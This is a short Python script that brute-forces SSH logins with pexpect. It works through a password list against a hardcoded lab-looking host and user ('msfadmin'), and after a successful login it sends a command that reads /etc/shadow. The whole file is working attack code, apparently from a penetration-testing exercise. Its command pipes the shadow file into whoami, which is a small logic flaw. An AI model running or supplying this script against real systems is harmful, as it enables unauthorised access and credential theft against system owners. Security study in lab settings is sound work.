#!/usr/bin/python
import pexpect
from termcolor import colored
PROMPT = ['# ', '>>> ', '> ', '\$ ', '~# ']

def send_command(child,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(hostkeyal, user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting (yes/no)?'
    connStr = 'ssh ' + hostkeyal + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect(['password:', ssh_newkey])
    if ret == 1:
        child.sendline('yes')
        ret = child.expect('password:')
    if ret != 0:
        print('[-] Error Connecting')
        return  # THIS WILL RETURN A NONE SO YOU SHOULD CHECK FOR IT.  SHOULD EXPLICITLY DO A return None TO MAKE IT CLEARER
    child.sendline(password)
    child.expect(PROMPT, timeout=0.5)
    return child
    
def main():
    hostkeyal = ' -oHostKeyAlgorithms=+ssh-dss '
    # host = input("Enter the IP address of target to Bruteforce: ")
    host = '192.168.1.75'
    user = 'msfadmin'
#    user = input("Enter the user account you want to brute force: ")
    file = open('passwords.txt', 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            child=connect(hostkeyal, user, host, password)
            print(colored('[+] Password Found ' + password, 'green'))
            send_command(child, 'cat /etc/shadow | whoami')
        except:
            print(colored('[-] WRONG Passowrd ' + password, 'red'))

if __name__ == '__main__':
    main()
